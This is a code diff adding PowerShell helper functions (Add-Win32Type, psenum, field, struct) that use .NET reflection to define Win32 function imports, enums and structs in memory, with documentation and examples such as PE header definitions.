+Add-Win32Type enables you to easily interact with unmanaged (i.e.
+Win32 unmanaged) functions in PowerShell. After providing
+Add-Win32Type with a function signature, a .NET type is created
+using reflection (i.e. csc.exe is never called like with Add-Type).
+The 'func' helper function can be used to reduce typing when defining
+multiple function definitions.
+.PARAMETER DllName
+The name of the DLL.
+.PARAMETER FunctionName
+The name of the target function.
+.PARAMETER EntryPoint
+The DLL export function name. This argument should be specified if the
+specified function name is different than the name of the exported
+function.
+.PARAMETER ReturnType
+The return type of the function.
+.PARAMETER ParameterTypes
+The function parameters.
+.PARAMETER NativeCallingConvention
+Specifies the native calling convention of the function. Defaults to
+stdcall.
+.PARAMETER Charset
+If you need to explicitly call an 'A' or 'W' Win32 function, you can
+specify the character set.
+.PARAMETER SetLastError
+Indicates whether the callee calls the SetLastError Win32 API
+function before returning from the attributed method.
+.PARAMETER Module
+The in-memory module that will host the functions. Use
+New-InMemoryModule to define an in-memory module.
+.PARAMETER Namespace
+An optional namespace to prepend to the type. Add-Win32Type defaults
+to a namespace consisting only of the name of the DLL.
+.EXAMPLE
+$Mod = New-InMemoryModule -ModuleName Win32
+$FunctionDefinitions = @(
+  (func kernel32 GetProcAddress ([IntPtr]) @([IntPtr], [String]) -Charset Ansi -SetLastError),
+  (func kernel32 GetModuleHandle ([Intptr]) @([String]) -SetLastError),
+  (func ntdll RtlGetCurrentPeb ([IntPtr]) @())
+)
+$Types = $FunctionDefinitions | Add-Win32Type -Module $Mod -Namespace 'Win32'
+$Kernel32 = $Types['kernel32']
+$Ntdll = $Types['ntdll']
+$Ntdll::RtlGetCurrentPeb()
+$ntdllbase = $Kernel32::GetModuleHandle('ntdll')
+$Kernel32::GetProcAddress($ntdllbase, 'RtlGetCurrentPeb')
+.NOTES
+Inspired by Lee Holmes' Invoke-WindowsApi http://poshcode.org/2189
+When defining multiple function prototypes, it is ideal to provide
+Add-Win32Type with an array of function signatures. That way, they
+are all incorporated into the same in-memory module.
+#>
+
+    [OutputType([Hashtable])]
+    Param(
+        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
+        [String]
+        $DllName,
+
+        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
+        [String]
+        $FunctionName,
+
+        [Parameter(ValueFromPipelineByPropertyName=$True)]
+        [String]
+        $EntryPoint,
+
+        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
+        [Type]
+        $ReturnType,
+
+        [Parameter(ValueFromPipelineByPropertyName=$True)]
+        [Type[]]
+        $ParameterTypes,
+
+        [Parameter(ValueFromPipelineByPropertyName=$True)]
+        [Runtime.InteropServices.CallingConvention]
+        $NativeCallingConvention = [Runtime.InteropServices.CallingConvention]::StdCall,
+
+        [Parameter(ValueFromPipelineByPropertyName=$True)]
+        [Runtime.InteropServices.CharSet]
+        $Charset = [Runtime.InteropServices.CharSet]::Auto,
+
+        [Parameter(ValueFromPipelineByPropertyName=$True)]
+        [Switch]
+        $SetLastError,
+
+        [Parameter(Mandatory=$True)]
+        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
+        $Module,
+
+        [ValidateNotNull()]
+        [String]
+        $Namespace = ''
+    )
+
+    BEGIN
+    {
+        $TypeHash = @{}
+    }
+
+    PROCESS
+    {
+        if ($Module -is [Reflection.Assembly])
+        {
+            if ($Namespace)
+            {
+                $TypeHash[$DllName] = $Module.GetType("$Namespace.$DllName")
+            }
+            else
+            {
+                $TypeHash[$DllName] = $Module.GetType($DllName)
+            }
+        }
+        else
+        {
+            # Define one type for each DLL
+            if (!$TypeHash.ContainsKey($DllName))
+            {
+                if ($Namespace)
+                {
+                    $TypeHash[$DllName] = $Module.DefineType("$Namespace.$DllName", 'Public,BeforeFieldInit')
+                }
+                else
+                {
+                    $TypeHash[$DllName] = $Module.DefineType($DllName, 'Public,BeforeFieldInit')
+                }
+            }
+
+            $Method = $TypeHash[$DllName].DefineMethod(
+                $FunctionName,
+                'Public,Static,PinvokeImpl',
+                $ReturnType,
+                $ParameterTypes)
+
+            # Make each ByRef parameter an Out parameter
+            $i = 1
+            foreach($Parameter in $ParameterTypes)
+            {
+                if ($Parameter.IsByRef)
+                {
+                    [void] $Method.DefineParameter($i, 'Out', $null)
+                }
+
+                $i++
+            }
+
+            $DllImport = [Runtime.InteropServices.DllImportAttribute]
+            $SetLastErrorField = $DllImport.GetField('SetLastError')
+            $CallingConventionField = $DllImport.GetField('CallingConvention')
+            $CharsetField = $DllImport.GetField('CharSet')
+            $EntryPointField = $DllImport.GetField('EntryPoint')
+            if ($SetLastError) { $SLEValue = $True } else { $SLEValue = $False }
+
+            if ($PSBoundParameters['EntryPoint']) { $ExportedFuncName = $EntryPoint } else { $ExportedFuncName = $FunctionName }
+
+            # Equivalent to C# version of [DllImport(DllName)]
+            $Constructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor([String])
+            $DllImportAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($Constructor,
+                $DllName, [Reflection.PropertyInfo[]] @(), [Object[]] @(),
+                [Reflection.FieldInfo[]] @($SetLastErrorField,
+                                           $CallingConventionField,
+                                           $CharsetField,
+                                           $EntryPointField),
+                [Object[]] @($SLEValue,
+                             ([Runtime.InteropServices.CallingConvention] $NativeCallingConvention),
+                             ([Runtime.InteropServices.CharSet] $Charset),
+                             $ExportedFuncName))
+
+            $Method.SetCustomAttribute($DllImportAttribute)
+        }
+    }
+
+    END
+    {
+        if ($Module -is [Reflection.Assembly])
+        {
+            return $TypeHash
+        }
+
+        $ReturnTypes = @{}
+
+        foreach ($Key in $TypeHash.Keys)
+        {
+            $Type = $TypeHash[$Key].CreateType()
+
+            $ReturnTypes[$Key] = $Type
+        }
+
+        return $ReturnTypes
+    }
+}
+
+
+function psenum {
+<#
+.SYNOPSIS
+Creates an in-memory enumeration for use in your PowerShell session.
+Author: Matthew Graeber (@mattifestation)
+License: BSD 3-Clause
+Required Dependencies: None
+Optional Dependencies: None
+.DESCRIPTION
+The 'psenum' function facilitates the creation of enums entirely in
+memory using as close to a "C style" as PowerShell will allow.
+.PARAMETER Module
+The in-memory module that will host the enum. Use
+New-InMemoryModule to define an in-memory module.
+.PARAMETER FullName
+The fully-qualified name of the enum.
+.PARAMETER Type
+The type of each enum element.
+.PARAMETER EnumElements
+A hashtable of enum elements.
+.PARAMETER Bitfield
+Specifies that the enum should be treated as a bitfield.
+.EXAMPLE
+$Mod = New-InMemoryModule -ModuleName Win32
+$ImageSubsystem = psenum $Mod PE.IMAGE_SUBSYSTEM UInt16 @{
+    UNKNOWN =                  0
+    NATIVE =                   1 # Image doesn't require a subsystem.
+    WINDOWS_GUI =              2 # Image runs in the Windows GUI subsystem.
+    WINDOWS_CUI =              3 # Image runs in the Windows character subsystem.
+    OS2_CUI =                  5 # Image runs in the OS/2 character subsystem.
+    POSIX_CUI =                7 # Image runs in the Posix character subsystem.
+    NATIVE_WINDOWS =           8 # Image is a native Win9x driver.
+    WINDOWS_CE_GUI =           9 # Image runs in the Windows CE subsystem.
+    EFI_APPLICATION =          10
+    EFI_BOOT_SERVICE_DRIVER =  11
+    EFI_RUNTIME_DRIVER =       12
+    EFI_ROM =                  13
+    XBOX =                     14
+    WINDOWS_BOOT_APPLICATION = 16
+}
+.NOTES
+PowerShell purists may disagree with the naming of this function but
+again, this was developed in such a way so as to emulate a "C style"
+definition as closely as possible. Sorry, I'm not going to name it
+New-Enum. :P
+#>
+
+    [OutputType([Type])]
+    Param (
+        [Parameter(Position = 0, Mandatory=$True)]
+        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
+        $Module,
+
+        [Parameter(Position = 1, Mandatory=$True)]
+        [ValidateNotNullOrEmpty()]
+        [String]
+        $FullName,
+
+        [Parameter(Position = 2, Mandatory=$True)]
+        [Type]
+        $Type,
+
+        [Parameter(Position = 3, Mandatory=$True)]
+        [ValidateNotNullOrEmpty()]
+        [Hashtable]
+        $EnumElements,
+
+        [Switch]
+        $Bitfield
+    )
+
+    if ($Module -is [Reflection.Assembly])
+    {
+        return ($Module.GetType($FullName))
+    }
+
+    $EnumType = $Type -as [Type]
+
+    $EnumBuilder = $Module.DefineEnum($FullName, 'Public', $EnumType)
+
+    if ($Bitfield)
+    {
+        $FlagsConstructor = [FlagsAttribute].GetConstructor(@())
+        $FlagsCustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($FlagsConstructor, @())
+        $EnumBuilder.SetCustomAttribute($FlagsCustomAttribute)
+    }
+
+    foreach ($Key in $EnumElements.Keys)
+    {
+        # Apply the specified enum type to each element
+        $null = $EnumBuilder.DefineLiteral($Key, $EnumElements[$Key] -as $EnumType)
+    }
+
+    $EnumBuilder.CreateType()
+}
+
+
+# A helper function used to reduce typing while defining struct
+# fields.
+function field {
+    Param (
+        [Parameter(Position = 0, Mandatory=$True)]
+        [UInt16]
+        $Position,
+
+        [Parameter(Position = 1, Mandatory=$True)]
+        [Type]
+        $Type,
+
+        [Parameter(Position = 2)]
+        [UInt16]
+        $Offset,
+
+        [Object[]]
+        $MarshalAs
+    )
+
+    @{
+        Position = $Position
+        Type = $Type -as [Type]
+        Offset = $Offset
+        MarshalAs = $MarshalAs
+    }
+}
+
+
+function struct
+{
+<#
+.SYNOPSIS
+Creates an in-memory struct for use in your PowerShell session.
+Author: Matthew Graeber (@mattifestation)
+License: BSD 3-Clause
+Required Dependencies: None
+Optional Dependencies: field
+.DESCRIPTION
+The 'struct' function facilitates the creation of structs entirely in
+memory using as close to a "C style" as PowerShell will allow. Struct
+fields are specified using a hashtable where each field of the struct
+is comprosed of the order in which it should be defined, its .NET
+type, and optionally, its offset and special marshaling attributes.
+One of the features of 'struct' is that after your struct is defined,
+it will come with a built-in GetSize method as well as an explicit
+converter so that you can easily cast an IntPtr to the struct without
+relying upon calling SizeOf and/or PtrToStructure in the Marshal
+class.
+.PARAMETER Module
+The in-memory module that will host the struct. Use
+New-InMemoryModule to define an in-memory module.
+.PARAMETER FullName
+The fully-qualified name of the struct.
+.PARAMETER StructFields
+A hashtable of fields. Use the 'field' helper function to ease
+defining each field.
+.PARAMETER PackingSize
+Specifies the memory alignment of fields.
+.PARAMETER ExplicitLayout
+Indicates that an explicit offset for each field will be specified.
+.EXAMPLE
+$Mod = New-InMemoryModule -ModuleName Win32
+$ImageDosSignature = psenum $Mod PE.IMAGE_DOS_SIGNATURE UInt16 @{
+    DOS_SIGNATURE =    0x5A4D
+    OS2_SIGNATURE =    0x454E
+    OS2_SIGNATURE_LE = 0x454C
+    VXD_SIGNATURE =    0x454C
+}
+$ImageDosHeader = struct $Mod PE.IMAGE_DOS_HEADER @{
+    e_magic =    field 0 $ImageDosSignature
+    e_cblp =     field 1 UInt16
+    e_cp =       field 2 UInt16
+    e_crlc =     field 3 UInt16
+    e_cparhdr =  field 4 UInt16
+    e_minalloc = field 5 UInt16
+    e_maxalloc = field 6 UInt16
+    e_ss =       field 7 UInt16
+    e_sp =       field 8 UInt16
+    e_csum =     field 9 UInt16
+    e_ip =       field 10 UInt16
+    e_cs =       field 11 UInt16
+    e_lfarlc =   field 12 UInt16
+    e_ovno =     field 13 UInt16
+    e_res =      field 14 UInt16[] -MarshalAs @('ByValArray', 4)
+    e_oemid =    field 15 UInt16
+    e_oeminfo =  field 16 UInt16
+    e_res2 =     field 17 UInt16[] -MarshalAs @('ByValArray', 10)
+    e_lfanew =   field 18 Int32
+}
+# Example of using an explicit layout in order to create a union.
+$TestUnion = struct $Mod TestUnion @{
+    field1 = field 0 UInt32 0
+    field2 = field 1 IntPtr 0
+} -ExplicitLayout
+.NOTES
+PowerShell purists may disagree with the naming of this function but
+again, this was developed in such a way so as to emulate a "C style"
+definition as closely as possible. Sorry, I'm not going to name it
+New-Struct. :P
+#>
+
+    [OutputType([Type])]
+    Param (
+        [Parameter(Position = 1, Mandatory=$True)]
+        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
+        $Module,
+
+        [Parameter(Position = 2, Mandatory=$True)]
+        [ValidateNotNullOrEmpty()]
+        [String]
+        $FullName,
+
+        [Parameter(Position = 3, Mandatory=$True)]
+        [ValidateNotNullOrEmpty()]
+        [Hashtable]
+        $StructFields,
+
+        [Reflection.Emit.PackingSize]
+        $PackingSize = [Reflection.Emit.PackingSize]::Unspecified,
+
+        [Switch]
+        $ExplicitLayout
+    )
+
+    if ($Module -is [Reflection.Assembly])
+    {
+        return ($Module.GetType($FullName))
+    }
+
+    [Reflection.TypeAttributes] $StructAttributes = 'AnsiClass,
+        Class,
+        Public,
+        Sealed,
+        BeforeFieldInit'
+
+    if ($ExplicitLayout)
+    {
+        $StructAttributes = $StructAttributes -bor [Reflection.TypeAttributes]::ExplicitLayout
+    }
+    else
+    {
+        $StructAttributes = $StructAttributes -bor [Reflection.TypeAttributes]::SequentialLayout
+    }
+
+    $StructBuilder = $Module.DefineType($FullName, $StructAttributes, [ValueType], $PackingSize)
+    $ConstructorInfo = [Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
+    $SizeConst = @([Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))
+
+    $Fields = New-Object Hashtable[]($StructFields.Count)
+
+    # Sort each field according to the orders specified
+    # Unfortunately, PSv2 doesn't have the luxury of the
+    # hashtable [Ordered] accelerator.
+    foreach ($Field in $StructFields.Keys)
+    {
+        $Index = $StructFields[$Field]['Position']
+        $Fields[$Index] = @{FieldName = $Field; Properties = $StructFields[$Field]}
+    }
+
+    foreach ($Field in $Fields)
+    {
+        $FieldName = $Field['FieldName']
+        $FieldProp = $Field['Properties']
+
+        $Offset = $FieldProp['Offset']
+        $Type = $FieldProp['Type']
+        $MarshalAs = $FieldProp['MarshalAs']
+
+        $NewField = $StructBuilder.DefineField($FieldName, $Type, 'Public')
+
+        if ($MarshalAs)
+        {
+            $UnmanagedType = $MarshalAs[0] -as ([Runtime.InteropServices.UnmanagedType])
+            if ($MarshalAs[1])
+            {
+                $Size = $MarshalAs[1]
+                $AttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder($ConstructorInfo,
+                    $UnmanagedType, $SizeConst, @($Size))
+            }
+            else
+            {
+                $AttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, [Object[]] @($UnmanagedType))
+            }
+
+            $NewField.SetCustomAttribute($AttribBuilder)
+        }
+
+        if ($ExplicitLayout) { $NewField.SetOffset($Offset) }
+    }
+
+    # Make the struct aware of its own size.
+    # No more having to call [Runtime.InteropServices.Marshal]::SizeOf!
+    $SizeMethod = $StructBuilder.DefineMethod('GetSize',
+        'Public, Static',
+        [Int],
+        [Type[]] @())
+    $ILGenerator = $SizeMethod.GetILGenerator()
+    # Thanks for the help, Jason Shirk!
+    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Ldtoken, $StructBuilder)
+    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Call,
+        [Type].GetMethod('GetTypeFromHandle'))
+    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Call,
+        [Runtime.InteropServices.Marshal].GetMethod('SizeOf', [Type[]] @([Type])))
+    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Ret)
+
+    # Allow for explicit casting from an IntPtr
+    # No more having to call [Runtime.InteropServices.Marshal]::PtrToStructure!
+    $ImplicitConverter = $StructBuilder.DefineMethod('op_Implicit',
+        'PrivateScope, Public, Static, HideBySig, SpecialName',
+        $StructBuilder,
+        [Type[]] @([IntPtr]))
+    $ILGenerator2 = $ImplicitConverter.GetILGenerator()
+    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Nop)
+    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ldarg_0)
+    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ldtoken, $StructBuilder)
+    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Call,
+        [Type].GetMethod('GetTypeFromHandle'))
+    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Call,
+        [Runtime.InteropServices.Marshal].GetMethod('PtrToStructure', [Type[]] @([IntPtr], [Type])))
+    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Unbox_Any, $StructBuilder)
+    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ret)
+
+    $StructBuilder.CreateType()
+}
